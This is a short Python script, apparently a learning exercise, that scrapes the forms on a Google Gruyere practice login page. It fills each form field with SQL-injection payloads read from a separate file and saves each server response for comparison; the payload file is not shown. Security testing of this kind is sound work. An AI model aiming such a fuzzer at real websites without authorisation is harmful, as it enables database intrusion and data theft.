import json
import requests
from parser import HTMLForm
from parser import HTMLTargetParser

def BEGIN():
	res = ["URL"]
	return res

def RUN(file_name):
    url = 'https://google-gruyere.appspot.com/471777688316025202488489537424605038600/login'
    try:
        r = requests.get(url)
        targetParser = HTMLTargetParser()
        targetParser.feed(r.text)
    except Exception:
        print("[-] The URL did not respond to the request")
        exit()

    if not targetParser.formList:
        print ("[-] The given URL had no forms for targetting")
        exit()

    defaultValue='cebola'
    payloadFileName='sql_inj_payload'
    payloadFile = open(payloadFileName,'r')

    for form in targetParser.formList:
        print (targetParser.formList[0].formType)
        #for payload in open(payloadFileName):
        dataValues={}
        for dataField in form.elementList:
            dataValues.update({dataField[1]:defaultValue})
            print (dataValues)
        try:
            if (form.formType == 'POST'):
                s = requests.post(url,data = dataValues,verify = True)  
                print (s.text)
            if (form.formType == 'GET'):
                s = requests.get(url, params=dataValues, verify = True)
            f = open('attempts/nonMaliciousAttempt','w')
            f.write(s.text)
            f.close()
        except Exception:
            print ("[-] An error occured while trying to send data")

    attempt=1
    for form in targetParser.formList:
        for payload in payloadFile: 
            dataValues={}
            for dataField in form.elementList:
                dataValues.update({dataField[1]:payload})
                print (dataValues)
            try:
                if (form.formType == 'POST'):
                    s = requests.post(url,data = dataValues,verify = True)  
                    print (s.text)
                if (form.formType == 'GET'):
                    s = requests.get(url, params=dataValues, verify = True)
                f = open('attempts/'+str(attempt),'w')
                f.write(s.text)
                f.close()
                attempt+=1
            except Exception:
                print ("[-] An error occured while trying to send data")

RUN("mope")